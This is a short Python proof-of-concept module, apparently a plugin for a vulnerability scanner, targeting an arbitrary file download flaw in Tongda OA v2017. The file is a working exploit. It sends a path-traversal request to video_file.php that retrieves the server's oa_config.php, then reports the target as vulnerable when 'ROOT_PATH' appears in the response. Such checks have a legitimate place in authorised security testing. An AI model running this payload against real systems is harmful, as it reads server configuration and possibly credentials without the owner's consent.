import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 通达OA_v2017_video_file_任意文件下载(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    exp_url=urldata+'general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php'
    try:
        renpose = requests.get(url=exp_url,headers=headers).text
        if 'ROOT_PATH' in renpose:
            print(Vcolors.RED + "[+] 存在通达OA_v2017_video_file_任意文件下载" + Vcolors.ENDC)
            print(Vcolors.RED + "[+] 验证地址为{}".format(exp_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在通达OA_v2017_video_file_任意文件下载" + Vcolors.ENDC)
    # except KeyError as e:
    #     pass
    except:
        logging.error("通达OA_v2017_video_file_任意文件下载漏洞执行脚本出现异常")



